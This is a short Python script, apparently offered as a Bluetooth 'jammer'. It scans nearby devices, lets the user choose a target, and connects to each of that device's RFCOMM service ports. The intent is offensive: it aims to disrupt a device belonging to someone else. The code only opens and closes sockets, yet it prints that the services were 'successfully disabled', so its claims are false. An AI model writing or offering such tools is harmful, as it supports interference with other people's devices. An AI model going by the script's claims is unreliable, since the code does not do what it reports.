import bluetooth
import time
import sys

def scan_and_choose_device():
    print("Scanning for available Bluetooth devices...")
    nearby_devices = bluetooth.discover_devices(lookup_names=True)

    if not nearby_devices:
        print("No Bluetooth devices found.")
        return None

    print("Available Bluetooth devices:")
    for i, (addr, name) in enumerate(nearby_devices):
        print(f"{i+1}. {name} ({addr})")

    try:
        choice = int(input("Enter the number corresponding to the target device: "))
        if choice < 1 or choice > len(nearby_devices):
            print("Invalid choice. Please select a valid number.")
            return None
        else:
            return nearby_devices[choice - 1][0]  # Return the device address
    except ValueError:
        print("Invalid input. Please enter a number.")
        return None

def jam_bluetooth(device_address):
    try:
        service_matches = bluetooth.find_service(address=device_address)

        if len(service_matches) == 0:
            print("No services found on the target device.")
            return

        for service in service_matches:
            port = service["port"]
            name = service["name"]
            host = service["host"]

            print(f"Disabling Bluetooth service '{name}' on host '{host}'")

            s = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            s.connect((host, port))
            s.close()

        print("Bluetooth services successfully disabled.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    device_address = scan_and_choose_device()
    if device_address:
        jam_bluetooth(device_address)
